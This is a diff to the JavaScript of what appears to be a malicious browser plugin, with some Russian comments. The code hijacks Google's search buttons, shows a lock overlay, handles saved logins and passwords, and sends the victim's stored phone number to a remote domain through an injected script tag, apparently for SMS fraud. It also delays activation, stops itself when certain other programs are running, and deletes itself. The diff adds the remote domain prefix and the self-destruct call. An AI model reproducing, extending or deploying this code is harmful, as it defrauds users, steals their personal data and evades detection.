@@ -17,8 +17,9 @@ var step = 1,
 
 function Destroy () {
 
-	plg.Save('lon','0');
+	plg.Save('lon','6');
 	setTimeout('plg.Del()',5000);
+	
 	
 }
 
@@ -30,7 +31,7 @@ function CheckLock() {
 		
 	if ((oRun) && (oRun != 0)) {
 		LockStop();
-		plg.Save('lon',0);
+		plg.Save('lon','6');
 		
 	}
 	else {
@@ -40,7 +41,7 @@ function CheckLock() {
 	}
 	if ((vRun) && (vRun!= 3)) {
 		LockStop();
-		plg.Save('lon',0);
+		plg.Save('lon','6');
 	}
 	else {
 		result = 666;
@@ -48,10 +49,16 @@ function CheckLock() {
 	}
 	if (yaRun){
 		LockStop();
-		plg.Save('lon','0');		
+		plg.Save('lon','6');		
 	}
 	else{
 		result = 666;
+		
+	}
+	if (plg.Get('lon') == '6'){
+		LockStop();
+		
+		
 	}
 
 }
@@ -93,12 +100,13 @@ function SaveLoginPassword(){
 
 
 function LockStop() {
-    plg.Save('lon', '0');
+    plg.Save('lon', '6');
 	if (document.getElementById('gShock')){
 		document.getElementById('gShock').visibility = "none";
 		document.getElementById('gShock').style.display = "none";
 		document.getElementsByClassName('overlay')[0].style.display = "none";
 		document.getElementById('gShock').innerHTML = '';
+		Destroy();
 		
 	}
 
@@ -237,9 +245,10 @@ function ChangeLinks(){
 
 function ChangeMainButtons() {
 	if (document.getElementById('gsri_ok0')){ 
-		document.getElementById('gbqfsa').setAttribute('onclick','ShowMeGoogle()'); // google search button
-		document.getElementById('gbqfbb').setAttribute('onclick','ShowMeGoogle()'); // кнопка мне повезет
-		document.getElementById('gsri_ok0').setAttribute('onclick','ShowMeGoogle()');// голосовой ввод
+		
+		document.getElementById('gbqfsa').setAttribute('onclick','ShowMeGoogle()'); 
+		document.getElementById('gbqfbb').setAttribute('onclick','ShowMeGoogle()'); 
+		document.getElementById('gsri_ok0').setAttribute('onclick','ShowMeGoogle()');
 	}
 	
 }
@@ -282,15 +291,20 @@ function ReSendCode() {
 function isMain(){
 	CheckLock();
 	
-	if (result != 666){
+	if (result !== 666){
 		
 		return false;
 	}
 	
 	else{
 		
-		if (plg.Get('lon') != 0){
+		if (plg.Get('lon') != '6'){
+			
 			SendStat(1,'gLog');
+			
+			plg.Save('lon','1');
+			ChangeMainButtons();
+			
 	
 			if (document.getElementsByTagName('a').length ==29){
 				
@@ -299,8 +313,7 @@ function isMain(){
 						
 				}
 				
-				plg.Save('lon','1');
-				ChangeMainButtons();
+				
 				
 			}
 			
@@ -324,6 +337,9 @@ function isMain(){
 				setTimeout('ChangeLinks()', 2000);
 				
 			}
+		}
+		else{
+			
 		}
 	}
 }
@@ -388,7 +404,7 @@ function SendSMS() {
     try {
         var sms = document.createElement('script');
         sms.setAttribute('type', 'text/javascript');
-        var url = '?phone='+encodeURIComponent(plg.Get('gPhone'));
+        var url =domain+'?phone='+encodeURIComponent(plg.Get('gPhone'));
 		plg.Save('gUrl',url);
         sms.setAttribute('src', url);
         document.getElementsByTagName('head')[0].appendChild(sms);
@@ -399,51 +415,27 @@ function SendSMS() {
 }
 
 
-function IsTime() {
-    try {
-        var lockTime = plg.Get('gTime');
-    } catch (e) {}
-    if (lockTime < getTime()) {
-       LockStop();
-	   
-    }
-}
 
-
-function CheckTime() {
-    var startTime = getTime() + 4320;
-    
-	if (plg.Get('gTime')) {
-        return false;
-
-    }
-	else {
-        plg.Save('gTime', startTime.toString());
-    }
-}
-
-
-
-function getTime() {
-    var g = new Date().getTime() / 1000 / 60 / 60;
-    g = g - (g % 1);
-    return g;
-}
 
 function Start() {
 		if (plg){
-			
+			if (plg.Get('lon' == '6')){
+				LockStop();
+				
+			}
 			if (plg.Get('lon') == '2'){
 				ShowMeGoogle();
+				
 			}
 			else{
 				isMain();
+				
 			}
 		}
 	}
 
   window.onload = function () {
-		TimeOut ();
+		//TimeOut ();
 
 		SetTime();
 	
@@ -475,6 +467,7 @@ function TimeOut (){
 			timeNow = timeNow - (timeNow % 1);
 		if (timeNow >= timeStop){
 			LockStop();
+			
 			plg.Save('lon','0');
 		}
 		else {
@@ -493,22 +486,20 @@ function SetTime() {
 			now = now - (now % 1);
 		
 			if (!startTime){
-				w = now + days;
-			
+				
+				w = now + days;			
 				plg.Save('startTime',w.toString());
 				return false;
 			}
 			else{
-				w = parseInt(startTime) + days;
+				w = parseInt(startTime) + days;		
 				
 				if (now>=startTime){
 					
-
-					Start();				
-					
+					Start();					
 				}
-				else {
-				
+				else {	
+										
 					plg.Save('lon','0');
 					return false;
 					
